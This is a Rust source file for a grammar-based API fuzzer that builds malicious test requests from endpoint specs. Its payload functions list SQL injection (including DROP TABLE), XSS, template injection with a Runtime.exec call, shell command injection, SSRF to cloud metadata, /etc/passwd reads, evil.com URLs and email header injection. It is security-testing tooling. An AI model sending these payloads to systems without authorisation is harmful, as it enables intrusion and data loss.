use std::collections::HashMap;
use std::fmt;

/// Grammar-based generative fuzzing engine for API endpoints.
///
/// Traditional fuzzers mutate existing inputs blindly. This engine takes
/// a different approach: it learns the *grammar* of the target API (from
/// OpenAPI specs, observed traffic, or inference), represents it as a
/// context-free grammar, then generates inputs that are syntactically
/// valid but semantically malicious.
///
/// The result: inputs that pass schema validation and reach deep application
/// logic, where the actual vulnerabilities hide.
///
/// Pipeline:
/// 1. Grammar extraction (OpenAPI → production rules)
/// 2. Type-aware value generation (boundary values per type)
/// 3. Attack payload injection (SQLi/XSS/SSTI into grammar slots)
/// 4. Constraint violation (violate min/max/pattern/enum constraints)
/// 5. Cross-parameter interaction (combine valid params with malicious ones)
///
/// A single production rule in the API grammar.
#[derive(Debug, Clone)]
pub struct ProductionRule {
    pub name: String,
    pub expansions: Vec<Expansion>,
}

/// One possible expansion of a production rule.
#[derive(Debug, Clone)]
pub struct Expansion {
    pub symbols: Vec<Symbol>,
    pub weight: f64,
}

/// A symbol in a grammar expansion — either a terminal (literal) or
/// a non-terminal (references another rule).
#[derive(Debug, Clone, PartialEq)]
pub enum Symbol {
    Terminal(String),
    NonTerminal(String),
    TypedSlot(SlotType),
}

impl fmt::Display for Symbol {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Terminal(s) => write!(f, "'{}'", s),
            Self::NonTerminal(s) => write!(f, "<{}>", s),
            Self::TypedSlot(t) => write!(f, "[{}]", t),
        }
    }
}

/// Parameter type slots that the grammar can expand with type-aware values.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SlotType {
    String,
    Integer,
    Float,
    Boolean,
    Email,
    Url,
    Uuid,
    Date,
    DateTime,
    IpAddress,
    Json,
    Array,
    Enum,
}

impl fmt::Display for SlotType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::String => write!(f, "string"),
            Self::Integer => write!(f, "integer"),
            Self::Float => write!(f, "float"),
            Self::Boolean => write!(f, "boolean"),
            Self::Email => write!(f, "email"),
            Self::Url => write!(f, "url"),
            Self::Uuid => write!(f, "uuid"),
            Self::Date => write!(f, "date"),
            Self::DateTime => write!(f, "datetime"),
            Self::IpAddress => write!(f, "ip"),
            Self::Json => write!(f, "json"),
            Self::Array => write!(f, "array"),
            Self::Enum => write!(f, "enum"),
        }
    }
}

/// Constraint on a parameter extracted from the API spec.
#[derive(Debug, Clone, Default)]
pub struct ParamConstraint {
    pub min_length: Option<usize>,
    pub max_length: Option<usize>,
    pub min_value: Option<f64>,
    pub max_value: Option<f64>,
    pub pattern: Option<String>,
    pub enum_values: Vec<String>,
    pub required: bool,
    pub nullable: bool,
}

/// An API endpoint extracted from a spec or traffic observation.
#[derive(Debug, Clone)]
pub struct ApiEndpoint {
    pub method: HttpMethod,
    pub path_template: String,
    pub parameters: Vec<ApiParameter>,
    pub request_body: Option<RequestBody>,
    pub response_codes: Vec<u16>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum HttpMethod {
    Get,
    Post,
    Put,
    Patch,
    Delete,
    Head,
    Options,
}

impl fmt::Display for HttpMethod {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Get => write!(f, "GET"),
            Self::Post => write!(f, "POST"),
            Self::Put => write!(f, "PUT"),
            Self::Patch => write!(f, "PATCH"),
            Self::Delete => write!(f, "DELETE"),
            Self::Head => write!(f, "HEAD"),
            Self::Options => write!(f, "OPTIONS"),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ParamLocation {
    Path,
    Query,
    Header,
    Cookie,
}

impl fmt::Display for ParamLocation {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Path => write!(f, "path"),
            Self::Query => write!(f, "query"),
            Self::Header => write!(f, "header"),
            Self::Cookie => write!(f, "cookie"),
        }
    }
}

#[derive(Debug, Clone)]
pub struct ApiParameter {
    pub name: String,
    pub location: ParamLocation,
    pub slot_type: SlotType,
    pub constraint: ParamConstraint,
}

#[derive(Debug, Clone)]
pub struct RequestBody {
    pub content_type: String,
    pub schema: Vec<BodyField>,
}

#[derive(Debug, Clone)]
pub struct BodyField {
    pub name: String,
    pub slot_type: SlotType,
    pub constraint: ParamConstraint,
    pub nested: Vec<BodyField>,
}

/// Strategy for generating malicious inputs from a grammar slot.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum MutationStrategy {
    /// Values at type boundaries (0, -1, MAX_INT, empty string, etc.)
    BoundaryValues,
    /// Type confusion (string where int expected, nested where flat expected)
    TypeConfusion,
    /// Constraint violation (exceed max_length, break pattern, invalid enum)
    ConstraintViolation,
    /// Inject attack payload into typed slot
    PayloadInjection,
    /// Null/undefined/missing required params
    NullInjection,
    /// Overflow values (extremely large numbers, very long strings)
    Overflow,
    /// Format string attacks (%s, %x, ${...}, #{...})
    FormatString,
    /// Duplicate parameters with different values
    ParameterDuplication,
    /// Negative testing (negative IDs, future dates, impossible combos)
    NegativeValues,
}

impl fmt::Display for MutationStrategy {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::BoundaryValues => write!(f, "boundary"),
            Self::TypeConfusion => write!(f, "type_confusion"),
            Self::ConstraintViolation => write!(f, "constraint_violation"),
            Self::PayloadInjection => write!(f, "payload_injection"),
            Self::NullInjection => write!(f, "null_injection"),
            Self::Overflow => write!(f, "overflow"),
            Self::FormatString => write!(f, "format_string"),
            Self::ParameterDuplication => write!(f, "param_duplication"),
            Self::NegativeValues => write!(f, "negative_values"),
        }
    }
}

impl MutationStrategy {
    pub fn all() -> &'static [Self] {
        &[
            Self::BoundaryValues,
            Self::TypeConfusion,
            Self::ConstraintViolation,
            Self::PayloadInjection,
            Self::NullInjection,
            Self::Overflow,
            Self::FormatString,
            Self::ParameterDuplication,
            Self::NegativeValues,
        ]
    }
}

/// A generated test case from the grammar fuzzer.
#[derive(Debug, Clone)]
pub struct GeneratedTestCase {
    pub endpoint: String,
    pub method: HttpMethod,
    pub parameters: HashMap<String, String>,
    pub body: Option<String>,
    pub headers: HashMap<String, String>,
    pub strategy: MutationStrategy,
    pub target_param: String,
    pub description: String,
}

/// Generate boundary values for a given slot type.
pub fn boundary_values(slot_type: SlotType) -> Vec<String> {
    match slot_type {
        SlotType::String => vec![
            String::new(),
            " ".into(),
            "a".into(),
            "A".repeat(10000),
            "\0".into(),
            "\t\n\r".into(),
            "null".into(),
            "undefined".into(),
            "true".into(),
            "false".into(),
            "NaN".into(),
            "Infinity".into(),
            "-1".into(),
            "0".into(),
            "[]".into(),
            "{}".into(),
            "<>".into(),
            "' OR '1'='1".into(),
            "${7*7}".into(),
            "{{7*7}}".into(),
        ],
        SlotType::Integer => vec![
            "0".into(),
            "1".into(),
            "-1".into(),
            "2147483647".into(),
            "-2147483648".into(),
            "9999999999999999".into(),
            "-9999999999999999".into(),
            "0.1".into(),
            "1e308".into(),
            "NaN".into(),
            "Infinity".into(),
            "0x7FFFFFFF".into(),
            "0xFFFFFFFF".into(),
            "".into(),
            "null".into(),
            "true".into(),
            "1; DROP TABLE users--".into(),
        ],
        SlotType::Float => vec![
            "0.0".into(),
            "-0.0".into(),
            "1.0".into(),
            "-1.0".into(),
            "0.1".into(),
            "0.0000001".into(),
            "999999999.999999".into(),
            "1e308".into(),
            "-1e308".into(),
            "1e-308".into(),
            "NaN".into(),
            "Infinity".into(),
            "-Infinity".into(),
            "".into(),
            "null".into(),
        ],
        SlotType::Boolean => vec![
            "true".into(),
            "false".into(),
            "1".into(),
            "0".into(),
            "yes".into(),
            "no".into(),
            "".into(),
            "null".into(),
            "2".into(),
            "-1".into(),
            "TRUE".into(),
            "False".into(),
        ],
        SlotType::Email => vec![
            "".into(),
            "test@example.com".into(),
            "a@b".into(),
            "@example.com".into(),
            "user@".into(),
            "user@.com".into(),
            "user@example..com".into(),
            "a".repeat(255) + "@example.com",
            "user+tag@example.com".into(),
            "\"user\"@example.com".into(),
            "user@127.0.0.1".into(),
            "user@[::1]".into(),
            "<script>alert(1)</script>@evil.com".into(),
            "user@example.com\r\nBcc: victim@evil.com".into(),
        ],
        SlotType::Url => vec![
            "".into(),
            "http://localhost".into(),
            "http://127.0.0.1".into(),
            "http://[::1]".into(),
            "file:///etc/passwd".into(),
            "javascript:alert(1)".into(),
            "data:text/html,<script>alert(1)</script>".into(),
            "http://169.254.169.254/latest/meta-data/".into(),
            "http://0x7f000001".into(),
            "http://example.com@evil.com".into(),
            "http://evil.com\\@example.com".into(),
            "//evil.com".into(),
            "http://example.com:99999".into(),
            "gopher://evil.com:25/".into(),
            "dict://evil.com:11111/".into(),
        ],
        SlotType::Uuid => vec![
            "".into(),
            "00000000-0000-0000-0000-000000000000".into(),
            "ffffffff-ffff-ffff-ffff-ffffffffffff".into(),
            "not-a-uuid".into(),
            "12345678-1234-1234-1234-123456789012".into(),
            "12345678123412341234123456789012".into(),
            "' OR '1'='1' --".into(),
            "../../../etc/passwd".into(),
        ],
        SlotType::Date => vec![
            "".into(),
            "2024-01-01".into(),
            "1970-01-01".into(),
            "9999-12-31".into(),
            "0000-00-00".into(),
            "2024-13-01".into(),
            "2024-01-32".into(),
            "2024-02-30".into(),
            "not-a-date".into(),
            "2024-01-01; DROP TABLE--".into(),
        ],
        SlotType::DateTime => vec![
            "".into(),
            "2024-01-01T00:00:00Z".into(),
            "1970-01-01T00:00:00Z".into(),
            "9999-12-31T23:59:59Z".into(),
            "2024-01-01T25:00:00Z".into(),
            "2024-01-01T00:60:00Z".into(),
            "not-a-datetime".into(),
        ],
        SlotType::IpAddress => vec![
            "".into(),
            "127.0.0.1".into(),
            "0.0.0.0".into(),
            "255.255.255.255".into(),
            "169.254.169.254".into(),
            "::1".into(),
            "::ffff:127.0.0.1".into(),
            "0x7f000001".into(),
            "2130706433".into(),
            "017700000001".into(),
            "127.0.0.1; ls".into(),
            "999.999.999.999".into(),
        ],
        SlotType::Json => vec![
            "{}".into(),
            "[]".into(),
            "null".into(),
            "\"\"".into(),
            "{\"__proto__\":{\"admin\":true}}".into(),
            "{\"constructor\":{\"prototype\":{\"admin\":true}}}".into(),
            "[".repeat(1000),
            "{".repeat(1000),
            r#"{"a":"b","a":"c"}"#.into(),
            format!("{{\"key\":\"{}\"}}", "A".repeat(10000)),
        ],
        SlotType::Array => vec![
            "[]".into(),
            "[1]".into(),
            "[1,2,3]".into(),
            format!(
                "[{}]",
                (0..1000)
                    .map(|i| i.to_string())
                    .collect::<Vec<_>>()
                    .join(",")
            ),
            "[[[[[[]]]]]]".into(),
            "[null,null,null]".into(),
            "[true,1,\"a\",null,[],{}]".into(),
            "not-an-array".into(),
        ],
        SlotType::Enum => vec![
            "".into(),
            "INVALID_ENUM_VALUE".into(),
            "null".into(),
            "0".into(),
            "-1".into(),
            "' OR 1=1--".into(),
        ],
    }
}

/// Generate type confusion payloads — send wrong type for expected type.
pub fn type_confusion_values(expected: SlotType) -> Vec<(String, String)> {
    let mut confused = Vec::new();
    match expected {
        SlotType::Integer => {
            confused.push(("string_for_int".into(), "\"hello\"".into()));
            confused.push(("array_for_int".into(), "[1,2,3]".into()));
            confused.push(("object_for_int".into(), "{\"value\":42}".into()));
            confused.push(("bool_for_int".into(), "true".into()));
            confused.push(("null_for_int".into(), "null".into()));
            confused.push(("float_for_int".into(), "3.14159".into()));
        }
        SlotType::String => {
            confused.push(("int_for_string".into(), "42".into()));
            confused.push(("array_for_string".into(), "[\"a\",\"b\"]".into()));
            confused.push(("object_for_string".into(), "{\"key\":\"val\"}".into()));
            confused.push(("bool_for_string".into(), "false".into()));
            confused.push(("null_for_string".into(), "null".into()));
        }
        SlotType::Boolean => {
            confused.push(("string_for_bool".into(), "\"maybe\"".into()));
            confused.push(("int_for_bool".into(), "2".into()));
            confused.push(("array_for_bool".into(), "[]".into()));
            confused.push(("object_for_bool".into(), "{}".into()));
        }
        SlotType::Array => {
            confused.push(("string_for_array".into(), "\"not-array\"".into()));
            confused.push(("int_for_array".into(), "42".into()));
            confused.push(("object_for_array".into(), "{\"0\":\"a\"}".into()));
        }
        SlotType::Json => {
            confused.push(("string_for_json".into(), "not json at all".into()));
            confused.push(("xml_for_json".into(), "<root><item>1</item></root>".into()));
            confused.push(("yaml_for_json".into(), "key: value\nlist:\n  - item".into()));
        }
        _ => {
            confused.push(("int_for_type".into(), "42".into()));
            confused.push(("array_for_type".into(), "[]".into()));
            confused.push(("null_for_type".into(), "null".into()));
        }
    }
    confused
}

/// Generate constraint violation values that specifically break a given constraint.
pub fn constraint_violations(
    slot_type: SlotType,
    constraint: &ParamConstraint,
) -> Vec<(String, String)> {
    let mut violations = Vec::new();

    if let Some(max_len) = constraint.max_length {
        let over = match slot_type {
            SlotType::String | SlotType::Email => "A".repeat(max_len + 1),
            _ => "9".repeat(max_len + 1),
        };
        violations.push((format!("exceeds_max_length_{}", max_len), over));
    }

    if let Some(min_len) = constraint.min_length
        && min_len > 0
    {
        let under = if min_len > 1 {
            "A".repeat(min_len - 1)
        } else {
            String::new()
        };
        violations.push((format!("below_min_length_{}", min_len), under));
    }

    if let Some(max_val) = constraint.max_value {
        violations.push((
            format!("exceeds_max_value_{}", max_val),
            format!("{}", max_val + 1.0),
        ));
        violations.push(("far_exceeds_max".into(), format!("{}", max_val * 1000.0)));
    }

    if let Some(min_val) = constraint.min_value {
        violations.push((
            format!("below_min_value_{}", min_val),
            format!("{}", min_val - 1.0),
        ));
        violations.push(("far_below_min".into(), format!("{}", min_val - 1000000.0)));
    }

    if !constraint.enum_values.is_empty() {
        violations.push(("invalid_enum".into(), "DEFINITELY_NOT_IN_ENUM".into()));
        violations.push(("empty_enum".into(), String::new()));
        if let Some(first) = constraint.enum_values.first() {
            violations.push(("enum_with_sqli".into(), format!("{}' OR '1'='1", first)));
        }
    }

    if constraint.required {
        violations.push(("missing_required".into(), String::new()));
        violations.push(("null_required".into(), "null".into()));
    }

    if !constraint.nullable {
        violations.push(("null_non_nullable".into(), "null".into()));
        violations.push(("undefined_non_nullable".into(), "undefined".into()));
    }

    violations
}

/// Attack payloads organized by injection type, designed to fit
/// into typed grammar slots while remaining syntactically close
/// to the expected format.
pub fn injection_payloads(slot_type: SlotType) -> Vec<(String, String)> {
    let mut payloads = Vec::new();

    let sqli = vec![
        ("sqli_basic", "' OR '1'='1"),
        ("sqli_union", "' UNION SELECT NULL,NULL--"),
        ("sqli_time", "' OR SLEEP(5)--"),
        ("sqli_stacked", "'; DROP TABLE users;--"),
        ("sqli_comment", "admin'--"),
    ];

    let xss = vec![
        ("xss_script", "<script>alert(1)</script>"),
        ("xss_img", "<img src=x onerror=alert(1)>"),
        ("xss_svg", "<svg onload=alert(1)>"),
        ("xss_event", "\" onfocus=alert(1) autofocus=\""),
        ("xss_template", "{{constructor.constructor('alert(1)')()}}"),
    ];

    let ssti = vec![
        ("ssti_jinja2", "{{7*7}}"),
        ("ssti_twig", "{{7*'7'}}"),
        ("ssti_freemarker", "${7*7}"),
        ("ssti_pebble", "{% set x=7*7 %}{{x}}"),
        (
            "ssti_thymeleaf",
            "__${T(java.lang.Runtime).getRuntime().exec('id')}__::",
        ),
    ];

    let cmdi = vec![
        ("cmdi_semicolon", "; id"),
        ("cmdi_pipe", "| id"),
        ("cmdi_backtick", "`id`"),
        ("cmdi_dollar", "$(id)"),
        ("cmdi_newline", "\nid"),
    ];

    let nosql = vec![
        ("nosql_ne", "{\"$ne\":null}"),
        ("nosql_gt", "{\"$gt\":\"\"}"),
        ("nosql_regex", "{\"$regex\":\".*\"}"),
        ("nosql_where", "{\"$where\":\"sleep(5000)\"}"),
    ];

    match slot_type {
        SlotType::String => {
            for (name, payload) in sqli.iter().chain(&xss).chain(&ssti).chain(&cmdi) {
                payloads.push((name.to_string(), payload.to_string()));
            }
        }
        SlotType::Integer | SlotType::Float => {
            for (name, payload) in &sqli {
                payloads.push((name.to_string(), payload.to_string()));
            }
            payloads.push(("int_sqli_inline".into(), "1 OR 1=1".into()));
            payloads.push(("int_sqli_union".into(), "1 UNION SELECT 1,2,3".into()));
        }
        SlotType::Email => {
            payloads.push(("email_sqli".into(), "admin'--@example.com".into()));
            payloads.push(("email_xss".into(), "<script>@evil.com".into()));
            payloads.push((
                "email_header_inj".into(),
                "user@example.com\r\nBcc: spy@evil.com".into(),
            ));
            payloads.push(("email_ssti".into(), "{{7*7}}@example.com".into()));
        }
        SlotType::Url => {
            payloads.push((
                "url_ssrf_aws".into(),
                "http://169.254.169.254/latest/meta-data/".into(),
            ));
            payloads.push((
                "url_ssrf_gcp".into(),
                "http://metadata.google.internal/computeMetadata/v1/".into(),
            ));
            payloads.push(("url_xss".into(), "javascript:alert(document.cookie)".into()));
            payloads.push(("url_file".into(), "file:///etc/passwd".into()));
            payloads.push(("url_gopher".into(), "gopher://evil.com:25/".into()));
        }
        SlotType::Json => {
            for (name, payload) in &nosql {
                payloads.push((name.to_string(), payload.to_string()));
            }
            payloads.push((
                "json_proto_pollution".into(),
                "{\"__proto__\":{\"admin\":true}}".into(),
            ));
            payloads.push((
                "json_constructor".into(),
                "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}".into(),
            ));
            payloads.push((
                "json_sqli".into(),
                "{\"$where\":\"this.password == 'x' || 1==1\"}".into(),
            ));
        }
        _ => {
            for (name, payload) in &sqli {
                payloads.push((name.to_string(), payload.to_string()));
            }
        }
    }

    payloads
}

/// Generate format string attack payloads for a slot type.
pub fn format_string_payloads() -> Vec<(String, String)> {
    vec![
        ("fmt_printf_s", "%s%s%s%s%s"),
        ("fmt_printf_x", "%x%x%x%x%x"),
        ("fmt_printf_n", "%n%n%n%n"),
        ("fmt_dollar_brace", "${7*7}"),
        ("fmt_hash_brace", "#{7*7}"),
        ("fmt_double_brace", "{{7*7}}"),
        ("fmt_percent_brace", "%{7*7}"),
        ("fmt_el_expr", "${applicationScope}"),
        ("fmt_spel", "#{T(java.lang.System).getenv()}"),
        ("fmt_ognl", "%{#_memberAccess.allowStaticMethodAccess=true}"),
        ("fmt_python_fstring", "{self.__class__.__mro__}"),
        ("fmt_ruby_erb", "<%=7*7%>"),
    ]
    .into_iter()
    .map(|(k, v)| (k.to_string(), v.to_string()))
    .collect()
}

/// Extract production rules from an OpenAPI-style endpoint definition.
pub fn extract_grammar(endpoints: &[ApiEndpoint]) -> Vec<ProductionRule> {
    let mut rules = Vec::new();

    let mut api_expansions = Vec::new();
    for (i, endpoint) in endpoints.iter().enumerate() {
        let rule_name = format!("endpoint_{}", i);
        api_expansions.push(Expansion {
            symbols: vec![Symbol::NonTerminal(rule_name.clone())],
            weight: 1.0,
        });

        let mut endpoint_symbols = vec![
            Symbol::Terminal(endpoint.method.to_string()),
            Symbol::Terminal(" ".into()),
        ];

        let path_parts: Vec<&str> = endpoint.path_template.split('/').collect();
        for (j, part) in path_parts.iter().enumerate() {
            if j > 0 {
                endpoint_symbols.push(Symbol::Terminal("/".into()));
            }
            if part.starts_with('{') && part.ends_with('}') {
                let param_name = &part[1..part.len() - 1];
                let param_type = endpoint
                    .parameters
                    .iter()
                    .find(|p| p.name == param_name && p.location == ParamLocation::Path)
                    .map(|p| p.slot_type)
                    .unwrap_or(SlotType::String);
                endpoint_symbols.push(Symbol::TypedSlot(param_type));
            } else {
                endpoint_symbols.push(Symbol::Terminal(part.to_string()));
            }
        }

        let query_params: Vec<&ApiParameter> = endpoint
            .parameters
            .iter()
            .filter(|p| p.location == ParamLocation::Query)
            .collect();
        if !query_params.is_empty() {
            endpoint_symbols.push(Symbol::Terminal("?".into()));
            for (k, param) in query_params.iter().enumerate() {
                if k > 0 {
                    endpoint_symbols.push(Symbol::Terminal("&".into()));
                }
                endpoint_symbols.push(Symbol::Terminal(format!("{}=", param.name)));
                endpoint_symbols.push(Symbol::TypedSlot(param.slot_type));
            }
        }

        rules.push(ProductionRule {
            name: rule_name,
            expansions: vec![Expansion {
                symbols: endpoint_symbols,
                weight: 1.0,
            }],
        });
    }

    rules.push(ProductionRule {
        name: "api".into(),
        expansions: api_expansions,
    });

    rules
}

/// Generate test cases for a single endpoint using all mutation strategies.
pub fn generate_test_cases(endpoint: &ApiEndpoint) -> Vec<GeneratedTestCase> {
    let mut cases = Vec::new();

    let all_params: Vec<&ApiParameter> = endpoint.parameters.iter().collect();

    for param in &all_params {
        let boundaries = boundary_values(param.slot_type);
        for value in boundaries {
            let mut params = HashMap::new();
            for other in &all_params {
                if other.name != param.name {
                    params.insert(other.name.clone(), default_value(other.slot_type));
                }
            }
            params.insert(param.name.clone(), value.clone());

            cases.push(GeneratedTestCase {
                endpoint: endpoint.path_template.clone(),
                method: endpoint.method,
                parameters: params,
                body: None,
                headers: HashMap::new(),
                strategy: MutationStrategy::BoundaryValues,
                target_param: param.name.clone(),
                description: format!(
                    "Boundary value '{}' for param '{}' ({})",
                    truncate_display(&value, 50),
                    param.name,
                    param.slot_type
                ),
            });
        }

        let confusions = type_confusion_values(param.slot_type);
        for (label, value) in confusions {
            let mut params = HashMap::new();
            for other in &all_params {
                if other.name != param.name {
                    params.insert(other.name.clone(), default_value(other.slot_type));
                }
            }
            params.insert(param.name.clone(), value);

            cases.push(GeneratedTestCase {
                endpoint: endpoint.path_template.clone(),
                method: endpoint.method,
                parameters: params,
                body: None,
                headers: HashMap::new(),
                strategy: MutationStrategy::TypeConfusion,
                target_param: param.name.clone(),
                description: format!("Type confusion '{}' for '{}'", label, param.name),
            });
        }

        let violations = constraint_violations(param.slot_type, &param.constraint);
        for (label, value) in violations {
            let mut params = HashMap::new();
            for other in &all_params {
                if other.name != param.name {
                    params.insert(other.name.clone(), default_value(other.slot_type));
                }
            }
            params.insert(param.name.clone(), value);

            cases.push(GeneratedTestCase {
                endpoint: endpoint.path_template.clone(),
                method: endpoint.method,
                parameters: params,
                body: None,
                headers: HashMap::new(),
                strategy: MutationStrategy::ConstraintViolation,
                target_param: param.name.clone(),
                description: format!("Constraint violation '{}' for '{}'", label, param.name),
            });
        }

        let injections = injection_payloads(param.slot_type);
        for (label, value) in injections {
            let mut params = HashMap::new();
            for other in &all_params {
                if other.name != param.name {
                    params.insert(other.name.clone(), default_value(other.slot_type));
                }
            }
            params.insert(param.name.clone(), value);

            cases.push(GeneratedTestCase {
                endpoint: endpoint.path_template.clone(),
                method: endpoint.method,
                parameters: params,
                body: None,
                headers: HashMap::new(),
                strategy: MutationStrategy::PayloadInjection,
                target_param: param.name.clone(),
                description: format!("Payload injection '{}' into '{}'", label, param.name),
            });
        }

        let fmt_payloads = format_string_payloads();
        for (label, value) in fmt_payloads {
            let mut params = HashMap::new();
            for other in &all_params {
                if other.name != param.name {
                    params.insert(other.name.clone(), default_value(other.slot_type));
                }
            }
            params.insert(param.name.clone(), value);

            cases.push(GeneratedTestCase {
                endpoint: endpoint.path_template.clone(),
                method: endpoint.method,
                parameters: params,
                body: None,
                headers: HashMap::new(),
                strategy: MutationStrategy::FormatString,
                target_param: param.name.clone(),
                description: format!("Format string '{}' into '{}'", label, param.name),
            });
        }
    }

    if let Some(body) = &endpoint.request_body {
        cases.extend(generate_body_test_cases(endpoint, body));
    }

    cases
}

fn generate_body_test_cases(endpoint: &ApiEndpoint, body: &RequestBody) -> Vec<GeneratedTestCase> {
    let mut cases = Vec::new();

    for field in &body.schema {
        let injections = injection_payloads(field.slot_type);
        for (label, value) in injections {
            let mut body_obj = HashMap::new();
            for other in &body.schema {
                if other.name != field.name {
                    body_obj.insert(
                        other.name.clone(),
                        format!("\"{}\"", default_value(other.slot_type)),
                    );
                }
            }
            body_obj.insert(
                field.name.clone(),
                format!("\"{}\"", value.replace('\"', "\\\"")),
            );

            let body_str = format!(
                "{{{}}}",
                body_obj
                    .iter()
                    .map(|(k, v)| format!("\"{}\":{}", k, v))
                    .collect::<Vec<_>>()
                    .join(",")
            );

            let mut headers = HashMap::new();
            headers.insert("Content-Type".into(), body.content_type.clone());

            cases.push(GeneratedTestCase {
                endpoint: endpoint.path_template.clone(),
                method: endpoint.method,
                parameters: HashMap::new(),
                body: Some(body_str),
                headers,
                strategy: MutationStrategy::PayloadInjection,
                target_param: field.name.clone(),
                description: format!("Body injection '{}' into field '{}'", label, field.name),
            });
        }
    }

    cases
}

fn default_value(slot_type: SlotType) -> String {
    match slot_type {
        SlotType::String => "test".into(),
        SlotType::Integer => "1".into(),
        SlotType::Float => "1.0".into(),
        SlotType::Boolean => "true".into(),
        SlotType::Email => "test@example.com".into(),
        SlotType::Url => "http://example.com".into(),
        SlotType::Uuid => "12345678-1234-1234-1234-123456789012".into(),
        SlotType::Date => "2024-01-01".into(),
        SlotType::DateTime => "2024-01-01T00:00:00Z".into(),
        SlotType::IpAddress => "127.0.0.1".into(),
        SlotType::Json => "{}".into(),
        SlotType::Array => "[]".into(),
        SlotType::Enum => "default".into(),
    }
}

fn truncate_display(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}...", &s[..max])
    }
}

/// Summary statistics for generated test cases.
#[derive(Debug, Clone)]
pub struct GenerationSummary {
    pub total_cases: usize,
    pub by_strategy: HashMap<String, usize>,
    pub by_param: HashMap<String, usize>,
    pub endpoints_covered: usize,
}

/// Summarize generated test cases.
pub fn summarize_generation(cases: &[GeneratedTestCase]) -> GenerationSummary {
    let mut by_strategy: HashMap<String, usize> = HashMap::new();
    let mut by_param: HashMap<String, usize> = HashMap::new();
    let mut endpoints: std::collections::HashSet<String> = std::collections::HashSet::new();

    for case in cases {
        *by_strategy.entry(case.strategy.to_string()).or_insert(0) += 1;
        *by_param.entry(case.target_param.clone()).or_insert(0) += 1;
        endpoints.insert(case.endpoint.clone());
    }

    GenerationSummary {
        total_cases: cases.len(),
        by_strategy,
        by_param,
        endpoints_covered: endpoints.len(),
    }
}

#[cfg(test)]
#[path = "grammar_fuzzer_test.rs"]
mod tests;
